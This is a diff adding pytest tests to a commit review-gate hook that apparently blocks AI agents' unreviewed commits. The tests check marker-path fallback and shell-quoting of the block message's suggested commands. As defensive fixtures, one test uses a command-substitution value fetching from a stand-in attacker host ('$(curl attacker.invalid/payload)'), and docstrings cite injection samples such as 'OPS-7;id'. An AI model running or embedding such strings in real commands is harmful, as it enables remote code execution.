@@ -29,6 +29,7 @@ from __future__ import annotations
 import importlib.util
 import io
 import json
+import os
 import shlex
 import subprocess
 import sys
@@ -677,6 +678,141 @@ def test_marker_stat_error_fails_open(tmp_path, monkeypatch):
     monkeypatch.setattr(sys, "stderr", err)
     monkeypatch.delenv("REVIEW_SKIP", raising=False)
     assert rr.main() == 0 and _decision(out.getvalue()) == "allow"
+
+
+def test_marker_path_empty_review_marker_falls_back_to_default(monkeypatch):
+    """REVIEW_MARKER="" (explicitly set to empty, not unset) must resolve to DEFAULT_MARKER,
+    not Path("") == cwd. `os.environ.get("REVIEW_MARKER", DEFAULT_MARKER)` alone would NOT
+    apply the default here — .get()'s default only fires when the key is absent, and an
+    explicitly-empty value IS present. Path("") resolving to cwd would let `_marker_is_fresh()`
+    treat cwd's own mtime as a review marker — a silent gate bypass on any recent write."""
+    expected = Path(os.path.expanduser(rr.DEFAULT_MARKER))
+    monkeypatch.setenv("REVIEW_MARKER", "")
+    assert rr.marker_path() == expected
+
+
+def test_marker_path_unset_review_marker_uses_default(monkeypatch):
+    """Baseline: REVIEW_MARKER genuinely unset also resolves to DEFAULT_MARKER."""
+    expected = Path(os.path.expanduser(rr.DEFAULT_MARKER))
+    monkeypatch.delenv("REVIEW_MARKER", raising=False)
+    assert rr.marker_path() == expected
+
+
+def test_block_message_shell_quotes_a_malicious_marker(monkeypatch):
+    """REVIEW_MARKER is env-controlled; the BLOCK message embeds it in a runnable-looking
+    `touch …` hint. An unquoted `$(...)` value would make that hint a copy-pasteable command
+    injection if an agent ran it verbatim outside a worktree-isolated session. The rendered
+    message must shell-quote the path, so the literal `$(` never appears unescaped."""
+    monkeypatch.setattr(rr, "marker_path", lambda: Path("$(curl attacker.invalid/payload)"))
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    # The malicious value must appear ONLY inside shlex-quoted single quotes — never bare
+    # after `touch `, which is what would let a shell re-interpret the `$(...)` on copy-paste.
+    assert "touch $(curl" not in message
+    assert "'$(curl attacker.invalid/payload)'" in message
+
+
+def test_block_message_quotes_a_marker_path_with_spaces(monkeypatch):
+    """A REVIEW_MARKER containing spaces (a legitimate, if unusual, path) must be rendered as
+    ONE shell-quoted token in the block message, not split across two bare words — otherwise
+    the suggested `touch <path>` command wouldn't target the actual configured marker."""
+    monkeypatch.setattr(rr, "marker_path", lambda: Path("/tmp/review markers/done"))
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "'/tmp/review markers/done'" in message
+    assert "touch /tmp/review markers/done" not in message
+
+
+def test_block_message_leads_with_the_zero_touch_staged_review_recipe(monkeypatch):
+    """The PRIMARY recipe in the block message must be `review diff --staged` — review-cli's
+    own `_touch_review_marker()` (reviewlib/install.py) already writes REVIEW_MARKER in
+    Python on a passing staged review, so an agent following this hint never constructs a
+    `touch` command at all, and the worktree-guard trap becomes moot for the common case.
+    The manual-touch instructions must be present too, but only as an explicitly-labeled
+    fallback, not the first thing an agent reads."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "review diff --staged" in message
+    assert message.index("review diff --staged") < message.index("FALLBACK")
+
+
+def test_block_message_never_recommends_a_broad_git_add_a(monkeypatch):
+    """Regression: the block message must not tell a blocked agent to RUN `git add -A` — a
+    broad add in a dirty/shared worktree can sweep in unrelated edits or untracked secrets
+    that then get reviewed and committed as if intentional (codex PR review finding).
+    Explaining WHY not to use `-A` (in prose, with backtick-quoted `-A`, not as a runnable
+    command) is fine and expected; the check targets the actual runnable form only."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "git add -A &&" not in message
+    assert "PRIMARY fix: `git add -A" not in message
+
+
+def test_block_message_primary_recipe_has_no_angle_bracket_placeholders(monkeypatch):
+    """Regression: `<TICKET-CODE>` and similar angle-bracket placeholders are shell
+    input-redirection syntax in bash/zsh, not a fill-in-the-blank convention — copying
+    `git add <the files you changed>` verbatim is a parse error, not a staged add (codex PR
+    review finding, independently verified: `bash -c 'git add <the files you changed>'`
+    exits 2 with a syntax error). The PRIMARY recipe span must use bare, shell-safe
+    placeholder text (e.g. `TICKET-CODE`, `path/to/changed-file.py`) with no `<`/`>`
+    characters. `<why>` inside the UNRELATED hatch-approval example further down the
+    message is a quoted shell VALUE, not a redirection target, so it is out of scope here —
+    scope the check to the primary-recipe span, not the whole message."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    primary_span = message[message.index("PRIMARY fix"):message.index("FALLBACK")]
+    assert "<" not in primary_span and ">" not in primary_span
+
+
+def test_block_message_task_code_placeholder_is_quoted(monkeypatch):
+    """Regression: review-cli accepts any non-whitespace string as a --task code, so an
+    untrusted/malformed task id containing shell metacharacters (e.g. `OPS-7;id`) run
+    UNQUOTED as `--task OPS-7;id` would execute `id` as a second shell command. The
+    PRIMARY recipe must show the task-code placeholder quoted (`--task 'TICKET-CODE'`),
+    not bare, so a reader copies the safe shape (codex PR review finding)."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "'TICKET-CODE'" in message
+    assert "--task TICKET-CODE" not in message  # bare/unquoted form must not appear
+
+
+def test_block_message_task_requirement_names_the_env_var_alternative(monkeypatch):
+    """Regression: the message must not claim a bare `--task` flag is the ONLY way to
+    supply a task code — `REVIEW_TASK_CODE=CODE review diff --staged` (no `--task` at all)
+    is an equally valid, already-documented alternative (SKILL.md, review-cli's own
+    `--help`). Saying '--task is required' without qualification contradicts that and
+    could send an agent hunting for a `--task` flag when it already set the env var
+    correctly (codex PR review finding)."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "REVIEW_TASK_CODE" in message
+
+
+def test_block_message_git_add_path_placeholder_is_quoted_with_dashdash(monkeypatch):
+    """Regression: `git add` does not sanitize its path argument — an unquoted real
+    filename containing shell metacharacters (e.g. `fix;id.py`) would execute `id` as a
+    second shell command, and a filename starting with `-` could be misread as a flag if
+    not preceded by `--`. The PRIMARY recipe must show `git add -- 'path...'`, quoted with
+    `--` first, not a bare unquoted path (codex PR review finding)."""
+    out = io.StringIO()
+    monkeypatch.setattr(sys, "stdout", out)
+    rr._block()
+    message = json.loads(out.getvalue())["message"]
+    assert "git add -- '" in message
 
 
 def test_unparsable_event_fails_open(monkeypatch):
